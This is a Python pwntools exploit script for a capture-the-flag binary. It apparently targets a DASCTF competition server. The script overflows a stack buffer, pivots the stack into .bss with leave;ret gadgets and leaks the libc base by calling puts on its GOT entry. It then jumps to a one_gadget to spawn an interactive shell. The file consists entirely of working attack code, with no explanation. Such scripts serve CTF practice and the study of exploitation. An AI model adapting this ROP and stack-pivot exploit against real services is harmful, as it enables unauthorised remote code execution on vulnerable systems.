from pwn import *
import sys
remote_addr = ["tcp.cloud.dasctf.com", 24154]
libc = ELF('./libc-2.23.so')
elf = ELF('./pwn')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug()

bss = 0x601900
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi = 0x400723
leave_ret = 0x400691
ret = 0x4004c6
vuln = 0x40063a

payload = b'a' * (0x40) + p64(0x601900) + b'\x75'
s(payload)

payload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)
payload = payload.ljust(0x40, b'a') + p64(0x6018b8) + p64(leave_ret)
pause()
s(payload)


libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']
pr('libc.address', libc.address)

system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\x00'))
one = libc.address + 0x4527a

payload = p64(one)
payload = payload.ljust(0x40, b'\x00') + p64(0x601890) + p64(leave_ret)

sa(b'just read!\n', payload)

shell()
